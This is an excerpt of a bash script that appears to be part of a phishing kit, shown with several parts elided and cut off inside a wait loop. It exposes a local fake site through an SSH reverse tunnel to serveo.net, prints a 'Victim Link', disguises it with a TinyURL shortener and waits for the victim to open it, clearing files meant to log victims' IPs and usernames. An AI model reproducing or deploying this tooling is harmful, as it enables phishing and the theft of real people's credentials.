...
start() {
    ...
    printf "3. Serveo\n"
    echo ""
    read -p $'\n\e[1;92m ┌─[ Choose the tunneling method:]─[~]\n └──╼ ~ ' host
    ...
    if [[ $host == 1 ]]; then
        ...
        printf "\e[1;91m[!] Invalid option! Defaulting to LocalTunnel...\n"
        sleep 1
        start_localtunnel
    fi
}
...
start_serveo() {
    rm -rf sites/$server/ip.txt sites/$server/usernames.txt
    printf "\e[1;92m[*] Starting Serveo...\n"
    ssh -R 80:localhost:5555 serveo.net > /dev/null 2>&1 &
    sleep 6
    serveo_url=$(curl -s https://serveo.net/status | grep -o 'https://[^"]*' | head -n 1)

    if [[ -z "$serveo_url" ]]; then
        printf "\e[1;91m[!] Serveo failed to start! Make sure SSH is installed.\n"
        exit 1
    fi

    printf "\e[1;92m[*] Victim Link:\e[0m %s\n" "$serveo_url"
    short_link=$(wget -q -O - http://tinyurl.com/api-create.php?url=$serveo_url)
    printf "\e[1;92m[*] Shortened Link:\e[0m %s\n" "$short_link"
    checkfound
}

checkfound() {
    printf "\e[1;93m[*] Waiting for victim to open the link...\n"
    while true; do
